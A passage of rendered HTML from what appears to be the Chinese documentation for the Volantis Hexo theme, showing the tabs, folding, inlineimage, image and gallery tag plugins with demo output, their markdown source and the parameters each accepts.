class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&lt;!-- tab 栏目2 --&gt;</span><br><span class="line">内容</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示效果-8"><a href="#演示效果-8" class="headerlink" title="演示效果"></a>演示效果</h3><div class="tabs" id="tab-id"><ul class="nav-tabs"><li class="tab active"><a class="#tab-id-1">栏目1</a></li><li class="tab"><a class="#tab-id-2">栏目2</a></li></ul><div class="tab-content"><div class="tab-pane active" id="tab-id-1"><p>。。。</p></div><div class="tab-pane" id="tab-id-2"><p>！！！</p></div></div></div><h3 id="上述示例的源码-9"><a href="#上述示例的源码-9" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs tab-id %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 栏目1 --&gt;</span><br><span class="line"></span><br><span class="line">。。。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 栏目2 --&gt;</span><br><span class="line"></span><br><span class="line">！！！</span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><br><h2 id="folding"><a href="#folding" class="headerlink" title="folding"></a>folding</h2><figure class="highlight md"><figcaption><span>最后更新于 <u>2.3</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 参数（可选）, 标题 %&#125;</span><br><span class="line">![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg)</span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示效果-9"><a href="#演示效果-9" class="headerlink" title="演示效果"></a>演示效果</h3><details ><summary> 查看图片测试 </summary>              <div class='content'>              <p><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg" srcset="data:image/png;base64,666"></p>              </div>            </details><details cyan open><summary> 查看默认打开的折叠框 </summary>              <div class='content'>              <p>这是一个默认打开的折叠框。</p>              </div>            </details><details green><summary> 查看代码测试 </summary>              <div class='content'>              <figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding green, 查看代码测试 %&#125;</span><br><span class="line"></span><br><span class="line">查看代码测试</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><details yellow><summary> 查看列表测试 </summary>              <div class='content'>              <ul><li>haha</li><li>hehe</li></ul>              </div>            </details><details red><summary> 查看嵌套测试 </summary>              <div class='content'>              <details blue><summary> 查看嵌套测试2 </summary>              <div class='content'>              <details ><summary> 查看嵌套测试3 </summary>              <div class='content'>              <p>hahaha <span><img src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png' style='height:24px'></span></p>              </div>            </details>              </div>            </details>              </div>            </details><h3 id="上述示例的源码-10"><a href="#上述示例的源码-10" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 查看图片测试 %&#125;</span><br><span class="line"></span><br><span class="line">![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg)</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding cyan open, 查看默认打开的折叠框 %&#125;</span><br><span class="line"></span><br><span class="line">这是一个默认打开的折叠框。</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding green, 查看代码测试 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding yellow, 查看列表测试 %&#125;</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> haha</span><br><span class="line"><span class="bullet">-</span> hehe</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding red, 查看嵌套测试 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding blue, 查看嵌套测试2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding 查看嵌套测试3 %&#125;</span><br><span class="line"></span><br><span class="line">hahaha <span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;height:24px&#x27;</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><h3 id="可以支持的参数-6"><a href="#可以支持的参数-6" class="headerlink" title="可以支持的参数"></a>可以支持的参数</h3><p>参数位置可以填写颜色和状态，多个参数用空格隔开。</p><h4 id="颜色-6"><a href="#颜色-6" class="headerlink" title="颜色"></a>颜色</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blue, cyan, green, yellow, red</span><br></pre></td></tr></table></figure><h4 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h4><p>状态填写 <code>open</code> 代表默认打开。</p><br><h2 id="inlineimage"><a href="#inlineimage" class="headerlink" title="inlineimage"></a>inlineimage</h2><p>Inlineimage 标签是一种行内图片标签，可以用来在一段话中间插入表情。</p><figure class="highlight md"><figcaption><span>本插件最后更新于 <u>4.0</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% inlineimage 图片链接, height=高度（可选） %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示效果-10"><a href="#演示效果-10" class="headerlink" title="演示效果"></a>演示效果</h3><p>这是 <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif" style="height:1.5em"/> 一段话。</p><p>这又是 <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif" style="height:40px;"/> 一段话。</p><h3 id="上述示例的源码-11"><a href="#上述示例的源码-11" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif %&#125; 一段话。</span><br><span class="line"></span><br><span class="line">这又是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif, height=40px %&#125; 一段话。</span><br></pre></td></tr></table></figure><h3 id="可以支持的参数-7"><a href="#可以支持的参数-7" class="headerlink" title="可以支持的参数"></a>可以支持的参数</h3><h4 id="高度"><a href="#高度" class="headerlink" title="高度"></a>高度</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">height&#x3D;20px</span><br></pre></td></tr></table></figure><br><h2 id="image"><a href="#image" class="headerlink" title="image"></a>image</h2><p>Image 标签是一种针对单个图片应用场景的标签，支持图片描述文字和指定宽度。</p><figure class="highlight md"><figcaption><span>本插件最后更新于 <u>4.0</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image 链接, width=宽度（可选）, height=高度（可选）, alt=描述（可选）, bg=占位颜色（可选） %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示效果-11"><a href="#演示效果-11" class="headerlink" title="演示效果"></a>演示效果</h3><p>添加描述：</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" srcset="data:image/png;base64,666" alt="每天下课回宿舍的路，没有什么故事。"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div><p>指定宽度：</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" srcset="data:image/png;base64,666" style="width:300px;"/></div></div><p>指定宽度并添加描述：</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" srcset="data:image/png;base64,666" alt="每天下课回宿舍的路，没有什么故事。" style="width:300px;"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div><p>设置占位背景色：</p><div class="img-wrap"><div class="img-bg" style="background:#224855"><img class="img lazyload" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" srcset="data:image/png;base64,666" alt="优化不同宽度浏览的观感" style="width:414px;"/></div><span class="image-caption">优化不同宽度浏览的观感</span></div><h3 id="上述示例的源码-12"><a href="#上述示例的源码-12" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">添加描述：</span><br><span class="line"></span><br><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br><span class="line"></span><br><span class="line">指定宽度：</span><br><span class="line"></span><br><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px %&#125;</span><br><span class="line"></span><br><span class="line">指定宽度并添加描述：</span><br><span class="line"></span><br><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br><span class="line"></span><br><span class="line">设置占位背景色：</span><br><span class="line"></span><br><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, bg=#1D0C04, alt=优化不同宽度浏览的观感 %&#125;</span><br></pre></td></tr></table></figure><h3 id="可以支持的参数-8"><a href="#可以支持的参数-8" class="headerlink" title="可以支持的参数"></a>可以支持的参数</h3><h4 id="图片宽高度"><a href="#图片宽高度" class="headerlink" title="图片宽高度"></a>图片宽高度</h4><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">width=300px, height=32px</span><br></pre></td></tr></table></figure><h4 id="图片描述"><a href="#图片描述" class="headerlink" title="图片描述"></a>图片描述</h4><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alt=图片描述</span><br></pre></td></tr></table></figure><h4 id="占位背景色"><a href="#占位背景色" class="headerlink" title="占位背景色"></a>占位背景色</h4><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bg=#f2f2f2</span><br></pre></td></tr></table></figure><br><h2 id="gallery"><a href="#gallery" class="headerlink" title="gallery"></a>gallery</h2><p>Gallery 标签是一种针对一组图片应用场景的标签。</p><figure class="highlight md"><figcaption><span>本插件最后更新于 <u>3.0</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery 参数, 列数 %&#125;</span><br><span class="line">![<span class="string">图片描述</span>](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/B18FCBB3-67FD-48CC-B4F3-457BA145F17A.jpeg</span>)</span><br><span class="line">![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/67239FBB-E15D-4F4F-8EE8-0F1C9F3C4E7C.jpeg)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示效果-12"><a href="#演示效果-12" class="headerlink" title="演示效果"></a>演示效果</h3><p>一行一个图片</p><div class="gallery ">              <p><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg" srcset="data:image/png;base64,666" alt="图片描述"></p>            </div><p>一行多个图片（不换行）</p><div class="gallery ">              <p><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/B18FCBB3-67FD-48CC-B4F3-457BA145F17A.jpeg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/B18FCBB3-67FD-48CC-B4F3-457BA145F17A.jpeg" srcset="data:image/png;base64,666" alt="图片描述"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/67239FBB-E15D-4F4F-8EE8-0F1C9F3C4E7C.jpeg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/67239FBB-E15D-4F4F-8EE8-0F1C9F3C4E7C.jpeg" srcset="data:image/png;base64,666" alt="图片描述"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/00E0F0ED-9F1C-407A-9AA6-545649D919F4.jpeg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/00E0F0ED-9F1C-407A-9AA6-545649D919F4.jpeg" srcset="data:image/png;base64,666" alt="图片描述"></p>            </div><p>多行多个图片（每行2～8个图片）</p><div class="gallery stretch" col='8'>              <p><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/007.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/007.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/008.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/008.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/009.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/009.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/010.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/010.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/011.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/011.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/013.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/013.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/014.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/014.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/015.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/015.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/017.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/017.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/018.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/018.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/020.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/020.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/021.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/021.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/022.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/022.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/023.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/023.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/024.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/024.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/026.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/026.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/027.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/027.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/028.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/028.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/00E0F0ED-9F1C-407A-9AA6-545649D919F4.jpeg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/00E0F0ED-9F1C-407A-9AA6-545649D919F4.jpeg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/030.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/030.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/031.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/031.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/032.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/032.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/036.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/036.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/037.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/037.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/040.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/040.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/041.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/041.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/043.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/043.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/044.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/044.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/045.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/045.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/047.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/047.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/048.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/048.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/049.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/049.jpg" srcset="data:image/png;base64,666"><br><img 